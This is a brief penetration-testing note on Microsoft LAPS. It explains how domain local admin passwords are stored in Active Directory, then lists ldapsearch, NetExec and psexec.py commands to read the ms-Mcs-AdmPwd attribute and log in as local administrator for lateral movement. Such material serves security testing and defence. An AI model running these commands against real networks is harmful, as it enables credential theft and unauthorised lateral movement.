**Microsoft LAPS (Local Administrator Password Solution)** automatically manages and rotates the **local administrator password** for domain‑joined computers. It stores each password securely in **Active Directory** under confidential attributes on the corresponding computer object, protected by **Access Control Lists (ACLs)**. Only authorized users/groups can read or reset these stored passwords. ([Hacking Articles](https://www.hackingarticles.in/credential-dumping-laps/?utm_source=chatgpt.com "Credential Dumping: LAPS"))

---

## How LAPS Works

1. LAPS is enabled via **Group Policy** (GPO) or built‑in Windows LAPS policy for modern OS versions.
    
2. The client machine periodically generates a **random local admin password** according to policy (length, complexity).
    
3. LAPS stores the new password in AD in the attribute `ms‑Mcs‑AdmPwd` on the computer object.
    
4. The **expiration time** is stored separately and used to determine when the password must change.
    
5. **Authorized users** can read this attribute to retrieve the local admin password for that specific machine. 
    

---

## Exploitation

#### LDAP Query – ms‑Mcs‑AdmPwd

If you have valid domain credentials with read permission, you can query the stored LAPS password using LDAP tools:

```bash
ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN>\user" -w <PASSWORD> \
  -b "CN=<ComputerName>,OU=<OU>,DC=<domain>,DC=<tld>" ms‑Mcs‑AdmPwd
```

This command retrieves the current LAPS password from AD. (Requires correct binding DN and rights.)



### NetExec LAPS Module

When authenticated, some tools can directly target LAPS via SMB/LDAP modules:

```
nxc smb <TARGET_IP> -u <USER> -p <PASSWORD> -M laps
```

This attempts to retrieve the LAPS password by querying the LAPS attribute via LDAP over SMB. 

---

## Post‑Extraction Usage

Once a LAPS password is obtained:

1. Use it to authenticate as local admin to the target machine:
    

```
psexec.py <domain>/<ComputerName>$:<LAPSPassword>@<IP>
```

2. Use it to escalate privileges or pivot laterally.
    

Because local admin accounts are unique per host under LAPS, lateral movement requires separate access for each machine.
